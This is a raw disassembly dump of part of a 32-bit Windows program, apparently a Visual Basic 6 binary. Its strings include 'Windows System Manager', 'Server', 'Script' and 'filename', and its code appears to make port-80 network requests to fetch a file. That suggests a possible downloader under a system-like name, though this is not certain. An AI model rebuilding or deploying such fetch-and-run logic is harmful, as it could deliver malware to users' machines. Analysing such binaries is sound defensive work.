  4038d2:	41                   	inc    %ecx
  4038d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4038d4:	73 69                	jae    0x40393f
  4038d6:	00 00                	add    %al,(%eax)
  4038d8:	5f                   	pop    %edi
  4038d9:	5f                   	pop    %edi
  4038da:	76 62                	jbe    0x40393e
  4038dc:	61                   	popa
  4038dd:	46                   	inc    %esi
  4038de:	72 65                	jb     0x403945
  4038e0:	65 56                	gs push %esi
  4038e2:	61                   	popa
  4038e3:	72 00                	jb     0x4038e5
  4038e5:	00 00                	add    %al,(%eax)
  4038e7:	00 5f 5f             	add    %bl,0x5f(%edi)
  4038ea:	76 62                	jbe    0x40394e
  4038ec:	61                   	popa
  4038ed:	53                   	push   %ebx
  4038ee:	74 72                	je     0x403962
  4038f0:	56                   	push   %esi
  4038f1:	61                   	popa
  4038f2:	72 4d                	jb     0x403941
  4038f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4038f5:	76 65                	jbe    0x40395c
  4038f7:	00 5f 5f             	add    %bl,0x5f(%edi)
  4038fa:	76 62                	jbe    0x40395e
  4038fc:	61                   	popa
  4038fd:	4f                   	dec    %edi
  4038fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4038ff:	45                   	inc    %ebp
  403900:	72 72                	jb     0x403974
  403902:	6f                   	outsl  %ds:(%esi),(%dx)
  403903:	72 00                	jb     0x403905
  403905:	00 00                	add    %al,(%eax)
  403907:	00 5f 5f             	add    %bl,0x5f(%edi)
  40390a:	76 62                	jbe    0x40396e
  40390c:	61                   	popa
  40390d:	46                   	inc    %esi
  40390e:	69 78 73 74 72 43 6f 	imul   $0x6f437274,0x73(%eax),%edi
  403915:	6e                   	outsb  %ds:(%esi),(%dx)
  403916:	73 74                	jae    0x40398c
  403918:	72 75                	jb     0x40398f
  40391a:	63 74 00 00          	arpl   %esi,0x0(%eax,%eax,1)
  40391e:	00 00                	add    %al,(%eax)
  403920:	5f                   	pop    %edi
  403921:	5f                   	pop    %edi
  403922:	76 62                	jbe    0x403986
  403924:	61                   	popa
  403925:	46                   	inc    %esi
  403926:	72 65                	jb     0x40398d
  403928:	65 56                	gs push %esi
  40392a:	61                   	popa
  40392b:	72 4c                	jb     0x403979
  40392d:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  403934:	5f                   	pop    %edi
  403935:	5f                   	pop    %edi
  403936:	76 62                	jbe    0x40399a
  403938:	61                   	popa
  403939:	46                   	inc    %esi
  40393a:	72 65                	jb     0x4039a1
  40393c:	65 53                	gs push %ebx
  40393e:	74 72                	je     0x4039b2
  403940:	00 00                	add    %al,(%eax)
  403942:	00 00                	add    %al,(%eax)
  403944:	5f                   	pop    %edi
  403945:	5f                   	pop    %edi
  403946:	76 62                	jbe    0x4039aa
  403948:	61                   	popa
  403949:	56                   	push   %esi
  40394a:	61                   	popa
  40394b:	72 44                	jb     0x403991
  40394d:	75 70                	jne    0x4039bf
  40394f:	00 5f 5f             	add    %bl,0x5f(%edi)
  403952:	76 62                	jbe    0x4039b6
  403954:	61                   	popa
  403955:	53                   	push   %ebx
  403956:	74 72                	je     0x4039ca
  403958:	4d                   	dec    %ebp
  403959:	6f                   	outsl  %ds:(%esi),(%dx)
  40395a:	76 65                	jbe    0x4039c1
  40395c:	00 00                	add    %al,(%eax)
  40395e:	00 00                	add    %al,(%eax)
  403960:	5f                   	pop    %edi
  403961:	5f                   	pop    %edi
  403962:	76 62                	jbe    0x4039c6
  403964:	61                   	popa
  403965:	53                   	push   %ebx
  403966:	74 72                	je     0x4039da
  403968:	43                   	inc    %ebx
  403969:	6f                   	outsl  %ds:(%esi),(%dx)
  40396a:	70 79                	jo     0x4039e5
  40396c:	00 00                	add    %al,(%eax)
  40396e:	00 00                	add    %al,(%eax)
  403970:	5f                   	pop    %edi
  403971:	5f                   	pop    %edi
  403972:	76 62                	jbe    0x4039d6
  403974:	61                   	popa
  403975:	46                   	inc    %esi
  403976:	72 65                	jb     0x4039dd
  403978:	65 4f                	gs dec %edi
  40397a:	62 6a 00             	bound  %ebp,0x0(%edx)
  40397d:	00 00                	add    %al,(%eax)
  40397f:	00 5f 5f             	add    %bl,0x5f(%edi)
  403982:	76 62                	jbe    0x4039e6
  403984:	61                   	popa
  403985:	48                   	dec    %eax
  403986:	72 65                	jb     0x4039ed
  403988:	73 75                	jae    0x4039ff
  40398a:	6c                   	insb   (%dx),%es:(%edi)
  40398b:	74 43                	je     0x4039d0
  40398d:	68 65 63 6b 4f       	push   $0x4f6b6365
  403992:	62 6a 00             	bound  %ebp,0x0(%edx)
  403995:	00 00                	add    %al,(%eax)
  403997:	00 5f 5f             	add    %bl,0x5f(%edi)
  40399a:	76 62                	jbe    0x4039fe
  40399c:	61                   	popa
  40399d:	4e                   	dec    %esi
  40399e:	65 77 32             	gs ja  0x4039d3
  4039a1:	00 00                	add    %al,(%eax)
  4039a3:	00 18                	add    %bl,(%eax)
  4039a5:	3a 40 00             	cmp    0x0(%eax),%al
  4039a8:	54                   	push   %esp
  4039a9:	28 40 00             	sub    %al,0x0(%eax)
  4039ac:	54                   	push   %esp
  4039ad:	28 40 00             	sub    %al,0x0(%eax)
  4039b0:	60                   	pusha
  4039b1:	28 40 00             	sub    %al,0x0(%eax)
  4039b4:	6c                   	insb   (%dx),%es:(%edi)
  4039b5:	28 40 00             	sub    %al,0x0(%eax)
  4039b8:	40                   	inc    %eax
  4039b9:	3b 40 00             	cmp    0x0(%eax),%eax
  4039bc:	48                   	dec    %eax
  4039bd:	3b 40 00             	cmp    0x0(%eax),%eax
  4039c0:	50                   	push   %eax
  4039c1:	3b 40 00             	cmp    0x0(%eax),%eax
	...
  4039f0:	10 01                	adc    %al,(%ecx)
  4039f2:	f9                   	stc
  4039f3:	06                   	push   %es
  4039f4:	ff                   	(bad)
  4039f5:	ff 00                	incl   (%eax)
  4039f7:	00 00                	add    %al,(%eax)
  4039f9:	00 00                	add    %al,(%eax)
  4039fb:	00 01                	add    %al,(%ecx)
  4039fd:	00 03                	add    %al,(%ebx)
  4039ff:	60                   	pusha
  403a00:	b8 39 40 00 00       	mov    $0x4039,%eax
	...
  403a0d:	00 00                	add    %al,(%eax)
  403a0f:	00 1e                	add    %bl,(%esi)
  403a11:	30 30                	xor    %dh,(%eax)
  403a13:	30 30                	xor    %dh,(%eax)
  403a15:	00 00                	add    %al,(%eax)
  403a17:	00 00                	add    %al,(%eax)
  403a19:	00 00                	add    %al,(%eax)
  403a1b:	00 a8 20 40 00 ff    	add    %ch,-0xffbfe0(%eax)
  403a21:	ff                   	(bad)
  403a22:	ff                   	(bad)
  403a23:	ff 00                	incl   (%eax)
  403a25:	00 00                	add    %al,(%eax)
  403a27:	00 0a                	add    %cl,(%edx)
  403a29:	00 00                	add    %al,(%eax)
  403a2b:	00 04 00             	add    %al,(%eax,%eax,1)
  403a2e:	00 00                	add    %al,(%eax)
  403a30:	58                   	pop    %eax
  403a31:	3a 40 00             	cmp    0x0(%eax),%al
  403a34:	00 00                	add    %al,(%eax)
  403a36:	00 00                	add    %al,(%eax)
  403a38:	c8 39 40 00          	enter  $0x4039,$0x0
  403a3c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403a3d:	39 40 00             	cmp    %eax,0x0(%eax)
  403a40:	a8 39                	test   $0x39,%al
  403a42:	40                   	inc    %eax
	...
  403a4f:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  403a53:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  403aa6:	00 00                	add    %al,(%eax)
  403aa8:	f0 39 40 00          	lock cmp %eax,0x0(%eax)
	...
  403ad4:	24 25                	and    $0x25,%al
  403ad6:	40                   	inc    %eax
  403ad7:	00 ff                	add    %bh,%bh
  403ad9:	ff                   	(bad)
  403ada:	ff                   	(bad)
  403adb:	ff 00                	incl   (%eax)
  403add:	00 00                	add    %al,(%eax)
  403adf:	00 a4 39 40 00 00 00 	add    %ah,0x40(%ecx,%edi,1)
  403ae6:	00 00                	add    %al,(%eax)
  403ae8:	f8                   	clc
  403ae9:	3a 40 00             	cmp    0x0(%eax),%al
  403aec:	00 00                	add    %al,(%eax)
  403aee:	00 00                	add    %al,(%eax)
  403af0:	ff                   	(bad)
  403af1:	ff                   	(bad)
  403af2:	ff                   	(bad)
  403af3:	ff 00                	incl   (%eax)
  403af5:	00 00                	add    %al,(%eax)
  403af7:	00 57 69             	add    %dl,0x69(%edi)
  403afa:	6e                   	outsb  %ds:(%esi),(%dx)
  403afb:	64 6f                	outsl  %fs:(%esi),(%dx)
  403afd:	77 73                	ja     0x403b72
  403aff:	20 53 79             	and    %dl,0x79(%ebx)
  403b02:	73 74                	jae    0x403b78
  403b04:	65 6d                	gs insl (%dx),%es:(%edi)
  403b06:	20 4d 61             	and    %cl,0x61(%ebp)
  403b09:	6e                   	outsb  %ds:(%esi),(%dx)
  403b0a:	61                   	popa
  403b0b:	67 65 72 00          	addr16 gs jb 0x403b0f
  403b0f:	00 cc                	add    %cl,%ah
  403b11:	27                   	daa
  403b12:	40                   	inc    %eax
  403b13:	00 64 27 40          	add    %ah,0x40(%edi,%eiz,1)
  403b17:	00 bc a3 40 00 cc 27 	add    %bh,0x27cc0040(%ebx,%eiz,4)
  403b1e:	40                   	inc    %eax
  403b1f:	00 f4                	add    %dh,%ah
  403b21:	27                   	daa
  403b22:	40                   	inc    %eax
  403b23:	00 c0                	add    %al,%al
  403b25:	a3 40 00 cc 27       	mov    %eax,0x27cc0040
  403b2a:	40                   	inc    %eax
  403b2b:	00 0c 28             	add    %cl,(%eax,%ebp,1)
  403b2e:	40                   	inc    %eax
  403b2f:	00 c4                	add    %al,%ah
  403b31:	a3 40 00 cc 27       	mov    %eax,0x27cc0040
  403b36:	40                   	inc    %eax
  403b37:	00 2c 28             	add    %ch,(%eax,%ebp,1)
  403b3a:	40                   	inc    %eax
  403b3b:	00 c8                	add    %cl,%al
  403b3d:	a3 40 00 53 65       	mov    %eax,0x65530040
  403b42:	72 76                	jb     0x403bba
  403b44:	65 72 00             	gs jb  0x403b47
  403b47:	00 53 63             	add    %dl,0x63(%ebx)
  403b4a:	72 69                	jb     0x403bb5
  403b4c:	70 74                	jo     0x403bc2
  403b4e:	00 00                	add    %al,(%eax)
  403b50:	66 69 6c 65 6e 61 6d 	imul   $0x6d61,0x6e(%ebp,%eiz,2),%bp
  403b57:	65 00 00             	add    %al,%gs:(%eax)
  403b5a:	00 00                	add    %al,(%eax)
  403b5c:	cc                   	int3
  403b5d:	cc                   	int3
  403b5e:	cc                   	int3
  403b5f:	cc                   	int3
  403b60:	e9 e9 e9 e9 cc       	jmp    0xcd2a254e
  403b65:	cc                   	int3
  403b66:	cc                   	int3
  403b67:	cc                   	int3
  403b68:	cc                   	int3
  403b69:	cc                   	int3
  403b6a:	cc                   	int3
  403b6b:	cc                   	int3
  403b6c:	cc                   	int3
  403b6d:	cc                   	int3
  403b6e:	cc                   	int3
  403b6f:	cc                   	int3
  403b70:	55                   	push   %ebp
  403b71:	8b ec                	mov    %esp,%ebp
  403b73:	83 ec 0c             	sub    $0xc,%esp
  403b76:	68 a6 14 40 00       	push   $0x4014a6
  403b7b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403b81:	50                   	push   %eax
  403b82:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403b89:	83 ec 50             	sub    $0x50,%esp
  403b8c:	53                   	push   %ebx
  403b8d:	56                   	push   %esi
  403b8e:	57                   	push   %edi
  403b8f:	89 65 f4             	mov    %esp,-0xc(%ebp)
  403b92:	c7 45 f8 70 11 40 00 	movl   $0x401170,-0x8(%ebp)
  403b99:	8b 45 08             	mov    0x8(%ebp),%eax
  403b9c:	8b c8                	mov    %eax,%ecx
  403b9e:	83 e1 01             	and    $0x1,%ecx
  403ba1:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  403ba4:	24 fe                	and    $0xfe,%al
  403ba6:	50                   	push   %eax
  403ba7:	89 45 08             	mov    %eax,0x8(%ebp)
  403baa:	8b 10                	mov    (%eax),%edx
  403bac:	ff 52 04             	call   *0x4(%edx)
  403baf:	a1 b8 a3 40 00       	mov    0x40a3b8,%eax
  403bb4:	33 ff                	xor    %edi,%edi
  403bb6:	3b c7                	cmp    %edi,%eax
  403bb8:	89 7d e8             	mov    %edi,-0x18(%ebp)
  403bbb:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  403bbe:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  403bc1:	89 7d c4             	mov    %edi,-0x3c(%ebp)
  403bc4:	89 7d b4             	mov    %edi,-0x4c(%ebp)
  403bc7:	75 10                	jne    0x403bd9
  403bc9:	68 b8 a3 40 00       	push   $0x40a3b8
  403bce:	68 ac 2e 40 00       	push   $0x402eac
  403bd3:	ff 15 e8 10 40 00    	call   *0x4010e8
  403bd9:	8b 35 b8 a3 40 00    	mov    0x40a3b8,%esi
  403bdf:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  403be2:	51                   	push   %ecx
  403be3:	56                   	push   %esi
  403be4:	8b 06                	mov    (%esi),%eax
  403be6:	ff 50 14             	call   *0x14(%eax)
  403be9:	3b c7                	cmp    %edi,%eax
  403beb:	db e2                	fnclex
  403bed:	7d 0f                	jge    0x403bfe
  403bef:	6a 14                	push   $0x14
  403bf1:	68 9c 2e 40 00       	push   $0x402e9c
  403bf6:	56                   	push   %esi
  403bf7:	50                   	push   %eax
  403bf8:	ff 15 38 10 40 00    	call   *0x401038
  403bfe:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403c01:	57                   	push   %edi
  403c02:	50                   	push   %eax
  403c03:	8b f0                	mov    %eax,%esi
  403c05:	8b 10                	mov    (%eax),%edx
  403c07:	ff 52 7c             	call   *0x7c(%edx)
  403c0a:	3b c7                	cmp    %edi,%eax
  403c0c:	db e2                	fnclex
  403c0e:	7d 0f                	jge    0x403c1f
  403c10:	6a 7c                	push   $0x7c
  403c12:	68 bc 2e 40 00       	push   $0x402ebc
  403c17:	56                   	push   %esi
  403c18:	50                   	push   %eax
  403c19:	ff 15 38 10 40 00    	call   *0x401038
  403c1f:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  403c22:	ff 15 60 11 40 00    	call   *0x401160
  403c28:	8b 35 20 11 40 00    	mov    0x401120,%esi
  403c2e:	8d 55 b4             	lea    -0x4c(%ebp),%edx
  403c31:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403c34:	c7 45 bc d0 2e 40 00 	movl   $0x402ed0,-0x44(%ebp)
  403c3b:	c7 45 b4 08 00 00 00 	movl   $0x8,-0x4c(%ebp)
  403c42:	ff d6                	call   *%esi
  403c44:	8b 3d 40 10 40 00    	mov    0x401040,%edi
  403c4a:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  403c4d:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  403c50:	50                   	push   %eax
  403c51:	51                   	push   %ecx
  403c52:	ff d7                	call   *%edi
  403c54:	8b 1d 10 10 40 00    	mov    0x401010,%ebx
  403c5a:	8d 55 c4             	lea    -0x3c(%ebp),%edx
  403c5d:	52                   	push   %edx
  403c5e:	ff d3                	call   *%ebx
  403c60:	8b d0                	mov    %eax,%edx
  403c62:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  403c65:	ff 15 38 11 40 00    	call   *0x401138
  403c6b:	8b d0                	mov    %eax,%edx
  403c6d:	8b 45 08             	mov    0x8(%ebp),%eax
  403c70:	8d 48 38             	lea    0x38(%eax),%ecx
  403c73:	ff 15 00 11 40 00    	call   *0x401100
  403c79:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  403c7c:	ff 15 64 11 40 00    	call   *0x401164
  403c82:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  403c85:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  403c88:	51                   	push   %ecx
  403c89:	52                   	push   %edx
  403c8a:	6a 02                	push   $0x2
  403c8c:	ff 15 18 10 40 00    	call   *0x401018
  403c92:	83 c4 0c             	add    $0xc,%esp
  403c95:	8d 55 b4             	lea    -0x4c(%ebp),%edx
  403c98:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403c9b:	c7 45 bc f0 2e 40 00 	movl   $0x402ef0,-0x44(%ebp)
  403ca2:	c7 45 b4 08 00 00 00 	movl   $0x8,-0x4c(%ebp)
  403ca9:	ff d6                	call   *%esi
  403cab:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  403cae:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  403cb1:	50                   	push   %eax
  403cb2:	51                   	push   %ecx
  403cb3:	ff d7                	call   *%edi
  403cb5:	8d 55 c4             	lea    -0x3c(%ebp),%edx
  403cb8:	52                   	push   %edx
  403cb9:	ff d3                	call   *%ebx
  403cbb:	8b d0                	mov    %eax,%edx
  403cbd:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  403cc0:	ff 15 38 11 40 00    	call   *0x401138
  403cc6:	8b d0                	mov    %eax,%edx
  403cc8:	8b 45 08             	mov    0x8(%ebp),%eax
  403ccb:	8d 48 3c             	lea    0x3c(%eax),%ecx
  403cce:	ff 15 00 11 40 00    	call   *0x401100
  403cd4:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  403cd7:	ff 15 64 11 40 00    	call   *0x401164
  403cdd:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  403ce0:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  403ce3:	51                   	push   %ecx
  403ce4:	52                   	push   %edx
  403ce5:	6a 02                	push   $0x2
  403ce7:	ff 15 18 10 40 00    	call   *0x401018
  403ced:	83 c4 0c             	add    $0xc,%esp
  403cf0:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403cf7:	68 25 3d 40 00       	push   $0x403d25
  403cfc:	eb 26                	jmp    0x403d24
  403cfe:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  403d01:	ff 15 64 11 40 00    	call   *0x401164
  403d07:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  403d0a:	ff 15 60 11 40 00    	call   *0x401160
  403d10:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  403d13:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403d16:	50                   	push   %eax
  403d17:	51                   	push   %ecx
  403d18:	6a 02                	push   $0x2
  403d1a:	ff 15 18 10 40 00    	call   *0x401018
  403d20:	83 c4 0c             	add    $0xc,%esp
  403d23:	c3                   	ret
  403d24:	c3                   	ret
  403d25:	8b 45 08             	mov    0x8(%ebp),%eax
  403d28:	50                   	push   %eax
  403d29:	8b 10                	mov    (%eax),%edx
  403d2b:	ff 52 08             	call   *0x8(%edx)
  403d2e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403d31:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  403d34:	5f                   	pop    %edi
  403d35:	5e                   	pop    %esi
  403d36:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403d3d:	5b                   	pop    %ebx
  403d3e:	8b e5                	mov    %ebp,%esp
  403d40:	5d                   	pop    %ebp
  403d41:	c2 04 00             	ret    $0x4
  403d44:	90                   	nop
  403d45:	90                   	nop
  403d46:	90                   	nop
  403d47:	90                   	nop
  403d48:	90                   	nop
  403d49:	90                   	nop
  403d4a:	90                   	nop
  403d4b:	90                   	nop
  403d4c:	90                   	nop
  403d4d:	90                   	nop
  403d4e:	90                   	nop
  403d4f:	90                   	nop
  403d50:	55                   	push   %ebp
  403d51:	8b ec                	mov    %esp,%ebp
  403d53:	83 ec 18             	sub    $0x18,%esp
  403d56:	68 a6 14 40 00       	push   $0x4014a6
  403d5b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403d61:	50                   	push   %eax
  403d62:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403d69:	b8 98 00 00 00       	mov    $0x98,%eax
  403d6e:	e8 2d d7 ff ff       	call   0x4014a0
  403d73:	53                   	push   %ebx
  403d74:	56                   	push   %esi
  403d75:	57                   	push   %edi
  403d76:	89 65 e8             	mov    %esp,-0x18(%ebp)
  403d79:	c7 45 ec 80 11 40 00 	movl   $0x401180,-0x14(%ebp)
  403d80:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  403d87:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  403d8e:	8b 45 08             	mov    0x8(%ebp),%eax
  403d91:	8b 08                	mov    (%eax),%ecx
  403d93:	8b 55 08             	mov    0x8(%ebp),%edx
  403d96:	52                   	push   %edx
  403d97:	ff 51 04             	call   *0x4(%ecx)
  403d9a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  403da1:	8b 45 18             	mov    0x18(%ebp),%eax
  403da4:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  403daa:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  403dad:	51                   	push   %ecx
  403dae:	68 00 10 00 00       	push   $0x1000
  403db3:	ff 15 94 10 40 00    	call   *0x401094
  403db9:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  403dc0:	6a ff                	push   $0xffffffff
  403dc2:	ff 15 4c 10 40 00    	call   *0x40104c
  403dc8:	c7 45 fc 03 00 00 00 	movl   $0x3,-0x4(%ebp)
  403dcf:	8d 55 94             	lea    -0x6c(%ebp),%edx
  403dd2:	52                   	push   %edx
  403dd3:	8b 45 14             	mov    0x14(%ebp),%eax
  403dd6:	50                   	push   %eax
  403dd7:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403dda:	8b 11                	mov    (%ecx),%edx
  403ddc:	8b 45 08             	mov    0x8(%ebp),%eax
  403ddf:	50                   	push   %eax
  403de0:	ff 92 00 07 00 00    	call   *0x700(%edx)
  403de6:	8d 4d 94             	lea    -0x6c(%ebp),%ecx
  403de9:	51                   	push   %ecx
  403dea:	ff 15 10 10 40 00    	call   *0x401010
  403df0:	8b d0                	mov    %eax,%edx
  403df2:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403df5:	ff 15 38 11 40 00    	call   *0x401138
  403dfb:	8d 4d 94             	lea    -0x6c(%ebp),%ecx
  403dfe:	ff 15 0c 10 40 00    	call   *0x40100c
  403e04:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%ebp)
  403e0b:	c7 45 b0 00 00 00 00 	movl   $0x0,-0x50(%ebp)
  403e12:	c7 45 fc 05 00 00 00 	movl   $0x5,-0x4(%ebp)
  403e19:	c7 45 cc 00 00 00 00 	movl   $0x0,-0x34(%ebp)
  403e20:	c7 45 fc 06 00 00 00 	movl   $0x6,-0x4(%ebp)
  403e27:	c7 45 c4 00 00 00 00 	movl   $0x0,-0x3c(%ebp)
  403e2e:	c7 45 fc 07 00 00 00 	movl   $0x7,-0x4(%ebp)
  403e35:	6a 00                	push   $0x0
  403e37:	6a 00                	push   $0x0
  403e39:	6a 00                	push   $0x0
  403e3b:	6a 00                	push   $0x0
  403e3d:	68 8c 26 40 00       	push   $0x40268c
  403e42:	8d 55 ac             	lea    -0x54(%ebp),%edx
  403e45:	52                   	push   %edx
  403e46:	ff 15 24 11 40 00    	call   *0x401124
  403e4c:	50                   	push   %eax
  403e4d:	e8 42 ec ff ff       	call   0x402a94
  403e52:	89 85 5c ff ff ff    	mov    %eax,-0xa4(%ebp)
  403e58:	ff 15 34 10 40 00    	call   *0x401034
  403e5e:	8b 85 5c ff ff ff    	mov    -0xa4(%ebp),%eax
  403e64:	89 45 b0             	mov    %eax,-0x50(%ebp)
  403e67:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  403e6a:	ff 15 64 11 40 00    	call   *0x401164
  403e70:	c7 45 fc 08 00 00 00 	movl   $0x8,-0x4(%ebp)
  403e77:	83 7d b0 00          	cmpl   $0x0,-0x50(%ebp)
  403e7b:	0f 84 ef 03 00 00    	je     0x404270
  403e81:	c7 45 fc 09 00 00 00 	movl   $0x9,-0x4(%ebp)
  403e88:	6a 00                	push   $0x0
  403e8a:	6a 00                	push   $0x0
  403e8c:	6a 03                	push   $0x3
  403e8e:	68 00 2f 40 00       	push   $0x402f00
  403e93:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  403e96:	51                   	push   %ecx
  403e97:	ff 15 24 11 40 00    	call   *0x401124
  403e9d:	50                   	push   %eax
  403e9e:	6a 00                	push   $0x0
  403ea0:	6a 50                	push   $0x50
  403ea2:	8b 55 0c             	mov    0xc(%ebp),%edx
  403ea5:	8b 02                	mov    (%edx),%eax
  403ea7:	50                   	push   %eax
  403ea8:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  403eab:	51                   	push   %ecx
  403eac:	ff 15 24 11 40 00    	call   *0x401124
  403eb2:	50                   	push   %eax
  403eb3:	8b 55 b0             	mov    -0x50(%ebp),%edx
  403eb6:	52                   	push   %edx
  403eb7:	e8 24 ec ff ff       	call   0x402ae0
  403ebc:	89 85 5c ff ff ff    	mov    %eax,-0xa4(%ebp)
  403ec2:	ff 15 34 10 40 00    	call   *0x401034
  403ec8:	8b 45 ac             	mov    -0x54(%ebp),%eax
  403ecb:	50                   	push   %eax
  403ecc:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403ecf:	51                   	push   %ecx
  403ed0:	ff 15 b8 10 40 00    	call   *0x4010b8
  403ed6:	8b 95 5c ff ff ff    	mov    -0xa4(%ebp),%edx
  403edc:	89 55 cc             	mov    %edx,-0x34(%ebp)
  403edf:	8d 45 a8             	lea    -0x58(%ebp),%eax
  403ee2:	50                   	push   %eax
  403ee3:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  403ee6:	51                   	push   %ecx
  403ee7:	6a 02                	push   $0x2
  403ee9:	ff 15 08 11 40 00    	call   *0x401108
  403eef:	83 c4 0c             	add    $0xc,%esp
  403ef2:	c7 45 fc 0a 00 00 00 	movl   $0xa,-0x4(%ebp)
  403ef9:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  403efd:	0f 84 45 03 00 00    	je     0x404248
  403f03:	c7 45 fc 0b 00 00 00 	movl   $0xb,-0x4(%ebp)
  403f0a:	6a 00                	push   $0x0
  403f0c:	68 00 00 00 80       	push   $0x80000000
  403f11:	6a 00                	push   $0x0
  403f13:	6a 00                	push   $0x0
  403f15:	68 00 2f 40 00       	push   $0x402f00
  403f1a:	8d 55 a4             	lea    -0x5c(%ebp),%edx
  403f1d:	52                   	push   %edx
  403f1e:	ff 15 24 11 40 00    	call   *0x401124
  403f24:	50                   	push   %eax
  403f25:	8b 45 10             	mov    0x10(%ebp),%eax
  403f28:	8b 08                	mov    (%eax),%ecx
  403f2a:	51                   	push   %ecx
  403f2b:	8d 55 a8             	lea    -0x58(%ebp),%edx
  403f2e:	52                   	push   %edx
  403f2f:	ff 15 24 11 40 00    	call   *0x401124
  403f35:	50                   	push   %eax
  403f36:	68 18 2f 40 00       	push   $0x402f18
  403f3b:	8d 45 ac             	lea    -0x54(%ebp),%eax
  403f3e:	50                   	push   %eax
  403f3f:	ff 15 24 11 40 00    	call   *0x401124
  403f45:	50                   	push   %eax
  403f46:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  403f49:	51                   	push   %ecx
  403f4a:	e8 29 ec ff ff       	call   0x402b78
  403f4f:	89 85 5c ff ff ff    	mov    %eax,-0xa4(%ebp)
  403f55:	ff 15 34 10 40 00    	call   *0x401034
  403f5b:	8b 55 a8             	mov    -0x58(%ebp),%edx
  403f5e:	52                   	push   %edx
  403f5f:	8b 45 10             	mov    0x10(%ebp),%eax
  403f62:	50                   	push   %eax
  403f63:	ff 15 b8 10 40 00    	call   *0x4010b8
  403f69:	8b 8d 5c ff ff ff    	mov    -0xa4(%ebp),%ecx
  403f6f:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  403f72:	8d 55 a4             	lea    -0x5c(%ebp),%edx
  403f75:	52                   	push   %edx
  403f76:	8d 45 a8             	lea    -0x58(%ebp),%eax
  403f79:	50                   	push   %eax
  403f7a:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  403f7d:	51                   	push   %ecx
  403f7e:	6a 03                	push   $0x3
  403f80:	ff 15 08 11 40 00    	call   *0x401108
  403f86:	83 c4 10             	add    $0x10,%esp
  403f89:	c7 45 fc 0c 00 00 00 	movl   $0xc,-0x4(%ebp)
  403f90:	83 7d c4 00          	cmpl   $0x0,-0x3c(%ebp)
  403f94:	0f 84 86 02 00 00    	je     0x404220
  403f9a:	c7 45 fc 0d 00 00 00 	movl   $0xd,-0x4(%ebp)
  403fa1:	68 28 2f 40 00       	push   $0x402f28
  403fa6:	68 34 26 40 00       	push   $0x402634
  403fab:	ff 15 28 10 40 00    	call   *0x401028
  403fb1:	8b d0                	mov    %eax,%edx
  403fb3:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  403fb6:	ff 15 38 11 40 00    	call   *0x401138
  403fbc:	50                   	push   %eax
  403fbd:	68 88 2f 40 00       	push   $0x402f88
  403fc2:	ff 15 28 10 40 00    	call   *0x401028
  403fc8:	8b d0                	mov    %eax,%edx
  403fca:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  403fcd:	ff 15 38 11 40 00    	call   *0x401138
  403fd3:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  403fd6:	ff 15 64 11 40 00    	call   *0x401164
  403fdc:	c7 45 fc 0e 00 00 00 	movl   $0xe,-0x4(%ebp)
  403fe3:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  403fe6:	52                   	push   %edx
  403fe7:	ff 15 14 10 40 00    	call   *0x401014
  403fed:	89 45 d8             	mov    %eax,-0x28(%ebp)
  403ff0:	c7 45 fc 0f 00 00 00 	movl   $0xf,-0x4(%ebp)
  403ff7:	8b 45 d8             	mov    -0x28(%ebp),%eax
